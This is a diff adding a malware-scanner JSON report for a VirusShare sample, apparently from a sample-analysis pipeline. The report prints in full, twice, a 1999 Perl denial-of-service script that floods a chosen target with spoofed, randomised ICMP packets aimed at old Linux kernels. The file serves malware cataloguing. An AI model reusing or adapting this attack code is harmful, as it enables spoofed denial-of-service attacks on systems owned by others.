@@ -1,0 +1,80 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "chr": "May attempt to obfuscate specific str"
+        },
+        "macro": "#!/usr/bin/perl\n# **************************************************************\n# DoS for Linux kernels from 2.2.7 to 2.2.9 reported in BUGTRAQ\n# 06/01/99 by Piotr Wilkin <pwl@wotan.2slo.wav.pl>\n# An attacker has to be in same ethernet segment with victim \n# I did't test it \n# coded by misteri0 from P.A.T.C.H.\n# Requires Net-RawIP-0.09 included in this directory\n# Edited for use with toast by Gridmark\n# **************************************************************\n$| = 1;\nrequire 'getopts.pl';\nuse Net::RawIP;\nGetopts('t:');\ndie \" misteri0\\@unet from P.A.T.C.H.\\n Usage $0 -t <target>\" unless\n$opt_t;\nsrand(time);\n$i = 996;\n$data .= chr(int rand(255)),$i-- while($i); \n\n$icmp = new Net::RawIP({\n                        ip => {\n                                 ihl => 6,\n\t\t\t         tot_len => 1024,\n\t\t\t         id => 1,\n\t\t\t         ttl => 255,\n\t\t\t         frag_off => 0,\n\t\t\t         daddr => $opt_t\n                               },\n\t\t\ticmp => { \n\t\t\t         id => 2650, \n\t\t\t\t data => $data \n\t\t\t\t}\n\t\t       });\n\t\t       \n $j++;\n $icmp->set({\n            ip => { saddr => 17000000 + int rand 4261000000 },\n            icmp => { \n\t             type => int rand(14),\n\t             code => int rand(10),\n\t\t     sequence => int rand(255)\n\t            }                                           \n          });\n $icmp->send;\n  print \"Linux-DoS sent...\\n\"\n# print \"[b00m] \" unless $j%1000;\t  \n\n\n"
+    },
+    "filename": "VirusShare_4af52286ae2e48d425ac9ef2a1bed457",
+    "filesize": 1396,
+    "filetype": "Perl script text executable",
+    "hashes": {
+        "md5": "4af52286ae2e48d425ac9ef2a1bed457",
+        "sha1": "c1ba211ee67852ad0254070805ce5d8e8ad86201",
+        "sha256": "ee8478e19260fb841f59dff9ce325e851c405b3bbad9c56011d31cd50ef30c47"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/usr/bin/perl",
+            "# **************************************************************",
+            "# DoS for Linux kernels from 2.2.7 to 2.2.9 reported in BUGTRAQ",
+            "# 06/01/99 by Piotr Wilkin <pwl@wotan.2slo.wav.pl>",
+            "# An attacker has to be in same ethernet segment with victim ",
+            "# I did't test it ",
+            "# coded by misteri0 from P.A.T.C.H.",
+            "# Requires Net-RawIP-0.09 included in this directory",
+            "# Edited for use with toast by Gridmark",
+            "# **************************************************************",
+            "$| = 1;",
+            "require 'getopts.pl';",
+            "use Net::RawIP;",
+            "Getopts('t:');",
+            "die \" misteri0\\@unet from P.A.T.C.H.\\n Usage $0 -t <target>\" unless",
+            "$opt_t;",
+            "srand(time);",
+            "$i = 996;",
+            "$data .= chr(int rand(255)),$i-- while($i); ",
+            "$icmp = new Net::RawIP({",
+            "                        ip => {",
+            "                                 ihl => 6,",
+            "\t\t\t         tot_len => 1024,",
+            "\t\t\t         id => 1,",
+            "\t\t\t         ttl => 255,",
+            "\t\t\t         frag_off => 0,",
+            "\t\t\t         daddr => $opt_t",
+            "                               },",
+            "\t\t\ticmp => { ",
+            "\t\t\t         id => 2650, ",
+            "\t\t\t\t data => $data ",
+            "\t\t\t\t}",
+            "\t\t       });",
+            "\t\t       ",
+            " $j++;",
+            " $icmp->set({",
+            "            ip => { saddr => 17000000 + int rand 4261000000 },",
+            "            icmp => { ",
+            "\t             type => int rand(14),",
+            "\t             code => int rand(10),",
+            "\t\t     sequence => int rand(255)",
+            "\t            }                                           ",
+            "          });",
+            " $icmp->send;",
+            "  print \"Linux-DoS sent...\\n\"",
+            "# print \"[b00m] \" unless $j%1000;\t  "
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.266890",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
